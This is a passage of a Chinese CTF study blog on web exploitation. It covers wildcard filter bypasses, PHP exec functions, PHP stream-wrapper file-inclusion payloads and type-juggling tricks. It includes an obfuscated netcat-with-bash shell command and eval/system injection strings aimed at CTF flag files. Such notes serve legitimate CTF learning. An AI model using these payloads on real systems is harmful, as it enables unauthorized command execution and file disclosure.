<h3 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?在linux里面可以进行代替一个任意字符：</span><br><span class="line"></span><br><span class="line">/???/[l-n]s     可替代<span class="built_in">ls</span></span><br><span class="line">/???/c?t test.txt  可替代<span class="built_in">cat</span> test.txt</span><br><span class="line"></span><br><span class="line">*在linux里面可以代替任意个任意字符：</span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> *.php 列出当前目录下所有php文件</span><br><span class="line"></span><br><span class="line">无字母数字匹配：</span><br><span class="line"></span><br><span class="line">如果我们遇到一个正则将字母数字$这些都过滤掉，要我们执行一个脚本的话.</span><br><span class="line">假如脚本名称为chakdiD且在根目录/etc下，我们可以用：</span><br><span class="line"></span><br><span class="line">. /???/???????[@-[]</span><br><span class="line">[@-[]表示取从@到[之间的字符，这之间的字符都为大写字母。这样就实现了无字母数字匹配的命令，就可以绕过正则了。</span><br><span class="line"></span><br><span class="line">给一个匹配表：</span><br><span class="line">字符 				解释</span><br><span class="line">*				匹配任意长度任意字符</span><br><span class="line">?				匹配任意单个字符</span><br><span class="line">[list]			匹配指定范围内（list）任意单个字符，也可以是单个字符组成的集合</span><br><span class="line">[^list]			匹配指定范围外的任意单个字符或字符集合</span><br><span class="line">[!list]			同[^list]		</span><br><span class="line">&#123;str1,str2,…&#125;	匹配 srt1 或者 srt2 或者更多字符串，也可以是集合</span><br><span class="line"></span><br><span class="line">几个例子：</span><br><span class="line"></span><br><span class="line"> /???/[:lower:]s</span><br><span class="line"> /?s?/???/[n]c 2130706433 8888 -e /???/b??h</span><br><span class="line">  <span class="built_in">ls</span> &#123;/ru,/tmp&#125;n</span><br><span class="line"></span><br><span class="line">字符匹配表参考：https://www.secpulse.com/archives/96374.html</span><br><span class="line"></span><br><span class="line">参考大佬的通配符利用：https://www.freebuf.com/articles/web/186298.html</span><br></pre></td></tr></table></figure>

<h3 id="PROC软链接溢出绕过"><a href="#PROC软链接溢出绕过" class="headerlink" title="PROC软链接溢出绕过"></a>PROC软链接溢出绕过</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>



<h2 id="PHP-Linux命令"><a href="#PHP-Linux命令" class="headerlink" title="PHP-Linux命令"></a>PHP-Linux命令</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span>()：执行一个外部程序，并获取输出。</span><br><span class="line">    语法：<span class="title function_ invoke__">exec</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">array</span> &amp;<span class="variable">$output</span> = <span class="literal">null</span>, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> = <span class="literal">null</span>): <span class="keyword">string</span>|<span class="literal">false</span></span><br><span class="line">    参数 <span class="variable">$command</span> 是要执行的命令；<span class="variable">$output</span> 是可选的，用于存储输出结果的数组；<span class="variable">$return_var</span> 是可选的，用于存储命令的返回值。</span><br><span class="line">    该函数返回字符串类型的输出结果，或者在失败时返回 <span class="literal">false</span>。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()：执行命令并获取输出。</span><br><span class="line">    语法：<span class="title function_ invoke__">shell_exec</span>(<span class="keyword">string</span> <span class="variable">$command</span>): <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    参数 <span class="variable">$command</span> 是要执行的命令。</span><br><span class="line">    该函数返回字符串类型的输出结果，或者在失败时返回 <span class="literal">null</span>。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">passthru</span>()：执行命令并直接将输出发送到输出流。</span><br><span class="line">    语法：<span class="title function_ invoke__">passthru</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> = <span class="literal">null</span>): <span class="keyword">void</span></span><br><span class="line">    参数 <span class="variable">$command</span> 是要执行的命令；<span class="variable">$return_var</span> 是可选的，用于存储命令的返回值。</span><br><span class="line">    该函数没有返回值，直接将输出发送到标准输出。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>()：执行命令，并显示输出结果。</span><br><span class="line">    语法：<span class="title function_ invoke__">system</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> = <span class="literal">null</span>): <span class="keyword">string</span>|<span class="literal">false</span></span><br><span class="line">    参数 <span class="variable">$command</span> 是要执行的命令；<span class="variable">$return_var</span> 是可选的，用于存储命令的返回值。</span><br><span class="line">    该函数返回字符串类型的输出结果，或者在失败时返回 <span class="literal">false</span>。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>()：在当前进程中执行外部程序。</span><br><span class="line">    语法：<span class="title function_ invoke__">pcntl_exec</span>(<span class="keyword">string</span> <span class="variable">$path</span>, <span class="keyword">array</span> <span class="variable">$args</span>, <span class="keyword">array</span> <span class="variable">$envs</span>): <span class="keyword">void</span></span><br><span class="line">    参数 <span class="variable">$path</span> 是要执行的外部程序路径；<span class="variable">$args</span> 是一个字符串数组，表示命令行参数；<span class="variable">$envs</span>是一个关联数组，表示环境变量。</span><br><span class="line">    该函数没有返回值，成功执行之后不会恢复到 PHP 脚本。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">proc_open</span>()：启动一个外部进程，并建立一个或多个管道来与其通信。</span><br><span class="line">    语法：resource|<span class="literal">false</span> <span class="title function_ invoke__">proc_open</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">array</span> <span class="variable">$descriptorspec</span>, <span class="keyword">array</span> &amp;<span class="variable">$pipes</span>, <span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$cwd</span> = <span class="literal">null</span>, <span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$env</span> = <span class="literal">null</span>, <span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$other_options</span> = <span class="literal">null</span>)</span><br><span class="line">    参数 <span class="variable">$command</span> 是要执行的命令；<span class="variable">$descriptorspec</span> 描述了进程的输入、输出和错误匿名管道的配置；<span class="variable">$pipes</span> 用于存储管道句柄的数组；<span class="variable">$cwd</span> 是可选的，表示子进程的当前工作目录；<span class="variable">$env</span> 是可选的，表示要设置的环境变量；<span class="variable">$other_options</span> 是可选的，表示其他进程选项。</span><br><span class="line">    该函数返回一个资源类型的进程句柄，或者在失败时返回 <span class="literal">false</span>。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">popen</span>()：打开一个管道连接到一个进程，可以用于读取或写入该进程的输出或输入。</span><br><span class="line">    语法：resource|<span class="literal">false</span> <span class="title function_ invoke__">popen</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">string</span> <span class="variable">$mode</span>)</span><br><span class="line">    参数 <span class="variable">$command</span> 是要执行的命令；<span class="variable">$mode</span> 表示打开管道的模式，可以是 <span class="string">&quot;r&quot;</span>（只读）或 <span class="string">&quot;w&quot;</span>（只写）。</span><br><span class="line">    该函数返回一个资源类型的文件指针，或者在失败时返回 <span class="literal">false</span>。</span><br></pre></td></tr></table></figure>

<p>实例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$command</span> = <span class="string">&quot;ls -l&quot;</span>;</span><br><span class="line"><span class="variable">$output</span> = [];</span><br><span class="line"><span class="variable">$return_var</span> = <span class="number">0</span>;</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="variable">$command</span>, <span class="variable">$output</span>, <span class="variable">$return_var</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$output</span> <span class="keyword">as</span> <span class="variable">$line</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$line</span> . PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span> = <span class="string">&quot;echo Hello World!&quot;</span>;</span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$command</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>; <span class="comment">// 输出：Hello World!</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span> = <span class="string">&quot;cat file.txt&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="variable">$command</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span> = <span class="string">&quot;php --version&quot;</span>;</span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">system</span>(<span class="variable">$command</span>, <span class="variable">$return_var</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>; <span class="comment">// 输出 PHP 的版本信息</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;/usr/bin/php&quot;</span>;</span><br><span class="line"><span class="variable">$args</span> = [<span class="string">&quot;script.php&quot;</span>, <span class="string">&quot;arg1&quot;</span>, <span class="string">&quot;arg2&quot;</span>];</span><br><span class="line"><span class="variable">$envs</span> = [<span class="string">&quot;ENV_VAR1&quot;</span> =&gt; <span class="string">&quot;value1&quot;</span>, <span class="string">&quot;ENV_VAR2&quot;</span> =&gt; <span class="string">&quot;value2&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>(<span class="variable">$path</span>, <span class="variable">$args</span>, <span class="variable">$envs</span>);</span><br><span class="line"><span class="comment">// 注意：若 exec 成功执行，以下的代码将不再执行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">`nl fl<span class="string">&#x27;&#x27;</span>ag.p<span class="string">&#x27;&#x27;</span>hp`</span><br></pre></td></tr></table></figure>

<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><p>源头1blog<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/13030717.html">点我</a></p>
<p>源头2blog<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087#item-1">点我</a></p>
<h3 id="概述-简述"><a href="#概述-简述" class="headerlink" title="概述/简述"></a>概述/简述</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">部分伪协议功能:</span><br><span class="line">phar:<span class="comment">// — PHP 归档</span></span><br><span class="line">file:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line">http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line">ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line">php:<span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line">zlib:<span class="comment">// — 压缩流</span></span><br><span class="line">data:<span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line">glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line">ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line">rar:<span class="comment">// — RAR</span></span><br><span class="line">ogg:<span class="comment">// — 音频流</span></span><br><span class="line">expect:<span class="comment">// — 处理交互式的流</span></span><br><span class="line"></span><br><span class="line">官网信息：https:<span class="comment">//www.php.net/manual/zh/wrappers.php</span></span><br><span class="line">或者搜索：PHP支持和封装的协议</span><br><span class="line">来源处:https:<span class="comment">//blog.csdn.net/qq_53142368/article/details/116594299</span></span><br></pre></td></tr></table></figure>



<h3 id="详细解部分伪协议"><a href="#详细解部分伪协议" class="headerlink" title="详细解部分伪协议"></a>详细解部分伪协议</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">一 file协议</span><br><span class="line"></span><br><span class="line">	PHP.ini：</span><br><span class="line">	file:<span class="comment">// 协议在双off的情况下也可以正常使用；</span></span><br><span class="line">	allow_url_fopen ：off/on</span><br><span class="line">	allow_url_include：off/on</span><br><span class="line">        </span><br><span class="line">    file:<span class="comment">// [文件的绝对路径和文件名]</span></span><br><span class="line"></span><br><span class="line">二.php:<span class="comment">//协议</span></span><br><span class="line">	不需要开启allow_url_fopen，仅php:<span class="comment">//input、 php://stdin、 php://memory 和 php://temp 需要开启allow_url_include。</span></span><br><span class="line">	php:<span class="comment">// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。</span></span><br><span class="line"></span><br><span class="line">	<span class="number">1</span>. php:<span class="comment">//filter</span></span><br><span class="line">		allow_url_fopen ：off/on</span><br><span class="line">		allow_url_include：off/on</span><br><span class="line">		php:<span class="comment">//filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。</span></span><br><span class="line">		resource=&lt;要过滤的数据流&gt;</span><br><span class="line">        read=&lt;读链的过滤器&gt;</span><br><span class="line">		write=&lt;写链的过滤器&gt;</span><br><span class="line">		&lt;; 两个链的过滤器&gt;</span><br><span class="line">		</span><br><span class="line">		convert.base64-encode &amp; convert.base64-decode 	</span><br><span class="line">            等同于<span class="title function_ invoke__">base64_encode</span>()和<span class="title function_ invoke__">base64_decode</span>()，base64编码解码</span><br><span class="line">		convert.quoted-printable-encode &amp; convert.quoted-printable-decode 	</span><br><span class="line">            quoted-printable 字符串与 <span class="number">8</span>-bit 字符串编码解码</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">		示例：?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=./cmd.php</span></span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">	<span class="number">2</span>. php:<span class="comment">//input</span></span><br><span class="line">		allow_url_fopen ：off/on</span><br><span class="line">		allow_url_include：on</span><br><span class="line">        可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分</span><br><span class="line">        在enctype=<span class="string">&quot;multipart/form-data&quot;</span> 的时候php:<span class="comment">//input 是无效的。</span></span><br><span class="line">        示例：</span><br><span class="line">            Get:?file=php:<span class="comment">//input</span></span><br><span class="line">			POST: <span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>()<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">三.zip:<span class="comment">//, bzip2://, zlib://协议	</span></span><br><span class="line">	zip:<span class="comment">//, bzip2://, zlib://协议在双off的情况下也可以正常使用；</span></span><br><span class="line">	allow_url_fopen ：off/on</span><br><span class="line">	allow_url_include：off/on</span><br><span class="line">    zip:<span class="comment">//, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。</span></span><br><span class="line"></span><br><span class="line">	<span class="number">1</span>.zip:<span class="comment">//协议</span></span><br><span class="line">		使用方法：</span><br><span class="line">		zip:<span class="comment">//archive.zip#dir/file.txt</span></span><br><span class="line">		zip:<span class="comment">// [压缩文件绝对路径]#[压缩文件内的子文件名]</span></span><br><span class="line">		eg:</span><br><span class="line">		?file=zip:<span class="comment">//D:/soft/phpStudy/WWW/file.jpg%23phpcode.txt</span></span><br><span class="line">	<span class="number">2</span>.bzip2:<span class="comment">//协议</span></span><br><span class="line">		使用方法：</span><br><span class="line">		compress.bzip2:<span class="comment">//file.bz2</span></span><br><span class="line">		测试现象：</span><br><span class="line">		?file=compress.bzip2:<span class="comment">//D:/soft/phpStudy/WWW/file.jpg</span></span><br><span class="line">		<span class="keyword">or</span></span><br><span class="line">		?file=compress.bzip2:<span class="comment">//./file.jpg</span></span><br><span class="line">	<span class="number">3</span>.zlib:<span class="comment">//协议</span></span><br><span class="line">		使用方法：</span><br><span class="line">		compress.zlib:<span class="comment">//file.gz</span></span><br><span class="line">		测试现象：</span><br><span class="line">		?file=compress.zlib:<span class="comment">//D:/soft/phpStudy/WWW/file.jpg</span></span><br><span class="line">		<span class="keyword">or</span></span><br><span class="line">		?file=compress.zlib:<span class="comment">//./file.jpg</span></span><br><span class="line">四.data:<span class="comment">//协议</span></span><br><span class="line">	经过测试官方文档上存在一处问题，经过测试PHP版本<span class="number">5.2</span>，<span class="number">5.3</span>，<span class="number">5.5</span>，<span class="number">7.0</span>；data:<span class="comment">// </span></span><br><span class="line">	协议是是受限于allow_url_fopen的，官方文档上给出的是NO，</span><br><span class="line">    所以要使用data:<span class="comment">//协议需要满足双on条件</span></span><br><span class="line">	PHP.ini：</span><br><span class="line">		data:<span class="comment">//协议必须双在on才能正常使用；</span></span><br><span class="line">		allow_url_fopen ：on</span><br><span class="line">		allow_url_include：on</span><br><span class="line">    测试现象：</span><br><span class="line">		?file=data:<span class="comment">//text/plain,&lt;?php phpinfo()?&gt;</span></span><br><span class="line">		<span class="keyword">or</span></span><br><span class="line">		?file=data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span></span><br></pre></td></tr></table></figure>

<p>小合集：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/read=convert.quoted-printable-encode/resource=flag.php</span></span><br><span class="line">compress.zlib:<span class="comment">//flag.php</span></span><br></pre></td></tr></table></figure>





<h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 正则表达式执行：x&amp;&amp;y||z</span></span><br><span class="line">对于“与”（&amp;&amp;） 运算： x &amp;&amp; y 当x为<span class="literal">false</span>时，直接跳过，不执行y；</span><br><span class="line">对于“或”（||） 运算 ：   x||y 当x为<span class="literal">true</span>时，直接跳过，不执行y。</span><br><span class="line"><span class="comment">//相当于：x=false,跳过y，x&amp;&amp;y整体记为false。访问z是否为true，是则表示整个式子为true</span></span><br><span class="line"><span class="comment"># 三个参数挨在一起的绕过：</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">	<span class="comment">#可以在$v3上做文章：$v3=-(xxxx)- ,$v3=|(xxxx)|</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数组绕过</span></span><br><span class="line"><span class="comment">// 场景1：示范：num[]=1</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;<span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125; </span><br><span class="line"><span class="comment">// 场景2：a[]=1&amp;b[]=43</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment"># %0a换行绕过</span></span><br><span class="line"><span class="comment">// $a=&#x27;%0aphp&#x27;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;&#125;</span><br><span class="line"><span class="comment">//$a=%0a1</span></span><br><span class="line"><span class="title function_ invoke__">is_numeric</span>(<span class="variable">$a</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 科学计数法e绕过</span></span><br><span class="line"><span class="comment">// ?num=44767e12</span></span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;<span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;<span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 八进制绕过正则表达式字母限制</span></span><br><span class="line"><span class="comment">// num=010574</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;<span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;<span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 小数点(浮点数)绕过限制</span></span><br><span class="line"><span class="comment">// ?num=4476.0</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;<span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;<span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;<span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># &quot;+&quot;和八进制绕过限制</span></span><br><span class="line"><span class="comment">// ?num=+010574</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;<span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;<span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;<span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br><span class="line"><span class="comment"># 特性漏洞</span></span><br><span class="line"><span class="comment">// 内置类    </span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Reflectionclass</span>()</span><br><span class="line"><span class="comment"># new ctfshow 和 $ctfshow的写法结果相同</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">#优先级</span></span><br><span class="line"><span class="comment"># 因为赋值的优先级高于逻辑运算，将优先处理is_numeric($v1)赋为$0的值 </span></span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 伪协议可以操作的函数：</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>()</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 一个奇妙的字符串：生成的字符串恰巧就是一个科学计数法字符串，形如：12e10</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;&lt;?=`cat *`;&quot;</span>;</span><br><span class="line"><span class="comment"># 这里的0到-1是舍弃等号的</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;11&#x27;</span>.<span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$a</span>),<span class="number">0</span>,-<span class="number">1</span>));</span><br><span class="line">    </span><br><span class="line"><span class="comment">#变量覆盖</span></span><br><span class="line">当遇到形如<span class="variable">$$key</span>=<span class="variable">$$value</span>的情况，适当的需要进行变量覆盖</span><br><span class="line">$<span class="string">&#x27;succ&#x27;</span>=$<span class="string">&#x27;flag&#x27;</span></span><br><span class="line">$<span class="string">&#x27;error&#x27;</span>=$<span class="string">&#x27;succ&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 报错函数注入</span></span><br><span class="line"><span class="comment"># ?v1=Exception&amp;v2=system(&#x27;ls&#x27;) </span></span><br><span class="line"><span class="comment"># ?v1=Reflectionclass&amp;v2=system(&#x27;cat fl36dg.txt&#x27;)</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">	<span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数特性利用</span></span><br><span class="line"><span class="comment"># ?v1=FilesystemIterator&amp;v2=getcwd</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;<span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;<span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数调用</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>)	<span class="comment">//$v1为函数名，$v2是函数参数</span></span><br><span class="line"><span class="comment">#各个进制</span></span><br><span class="line">以下是常见的各个进制以及它们的基数和表示方法的介绍：</span><br><span class="line"></span><br><span class="line">    二进制（Binary）：使用<span class="number">0</span>和<span class="number">1</span>两个数字表示。在计算机科学和数字电子技术中广泛应用。例如：<span class="number">101010</span>（二进制）表示<span class="number">42</span>（十进制）。</span><br><span class="line"></span><br><span class="line">    三进制（Ternary）：使用<span class="number">0</span>、<span class="number">1</span>和<span class="number">2</span>三个数字表示。在某些编程语言和逻辑电路设计中使用。例如：<span class="number">121</span>（三进制）表示<span class="number">16</span>（十进制）。</span><br><span class="line"></span><br><span class="line">    四进制（Quaternary）：使用<span class="number">0</span>、<span class="number">1</span>、<span class="number">2</span>和<span class="number">3</span>四个数字表示。在一些古代文献和某些领域中使用。例如：<span class="number">33</span>（四进制）表示<span class="number">15</span>（十进制）。</span><br><span class="line"></span><br><span class="line">    五进制（Quinary）：使用<span class="number">0</span>、<span class="number">1</span>、<span class="number">2</span>、<span class="number">3</span>和<span class="number">4</span>五个数字表示。在某些计数系统和音乐理论中使用。例如：<span class="number">40</span>（五进制）表示<span 